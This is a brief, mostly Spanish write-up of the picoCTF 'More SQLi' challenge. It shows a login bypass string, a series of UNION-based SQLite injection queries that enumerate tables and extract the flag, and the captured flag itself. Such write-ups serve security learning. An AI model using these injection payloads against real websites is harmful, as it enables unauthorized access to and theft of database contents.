##  More SQLi
## Descripcion
Can you find the flag on this website.Try to find the flag [here](http://saturn.picoctf.net:51289/).
## Solucion_sql injection

username: admin
password: admin
SQL query: SELECT id FROM users WHERE password = 'admin' AND username = 'admin'



|                                                         |
| ------------------------------------------------------- |
| picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_78d0583a} |

## Notas

- Pasamos la pantalla de login , poniendo las siguientes cadenas , usuario y password:

`' or 1=1; ' or 1=1;`

- en el campo de búsqueda, usamos, una a una , las siguientes consultas para encontrar la bandera:

`ciudad' union select 1,2,3; ciudad' union select sqlite_version(),2,3; ciudad' union select 1,2,tbl_name FROM sqlite_master WHERE type='table' ; ciudad' union select 1,sql,tbl_name FROM sqlite_master WHERE type='table' ; ciudad' union select 1,2,flag from more_table;`
## Referencias

- SQLite Injection: [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md")